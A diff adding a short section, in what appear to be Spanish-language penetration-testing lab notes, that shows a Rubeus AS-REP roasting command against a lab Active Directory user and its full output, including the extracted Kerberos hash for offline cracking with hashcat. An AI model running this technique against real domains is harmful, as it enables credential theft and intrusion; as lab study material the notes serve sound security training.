@@ -128,3 +128,34 @@ Started: Mon Jan 20 18:36:34 2025
 Stopped: Mon Jan 20 18:36:51 2025
 PS C:\Users\Grunt\Desktop\hashcat-6.2.6>
 ```
+### Ejemplo con rubeus
+```powershell
+PS C:\Tools> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : ygroce
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
+[*] SamAccountName         : ygroce
+[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:7B4DFA78CECC3103456127E749F59E12$3E514BF660DA0DBFBBFAA7DCC8DA348E180BA9DFB8EB46750823ACCACA6D135F586480A88D9EDD205A2DBCDC03D8719234FABDE76E70177FDF902AB782C1DFB175CE7281AFE83560F0008A259AC843B0AFE0162967D5E8DFB3925DA3E1E115F5DFAD2161F5B48966A73EA7CD267F1A5A6DF95C3CB8DE45BA5F9417DB3126069B754659B0DA5BB559B1AEB72DC120A392646CDF74625F4DB2B0B2A0FCD05415FB1E37E5A4826CF8E7A9FA5C2991F3C7B2CB6B01ED6F3FC009B97E0418916CC5AC3752D80093D4F9D630927F67C35A12A1BE1408AC63D13A064A4A7801AB355205D6D9B15E9E07F52C48249329C1352300B6D5C78AF11BCD142BFC
+
+PS C:\Tools>
+```
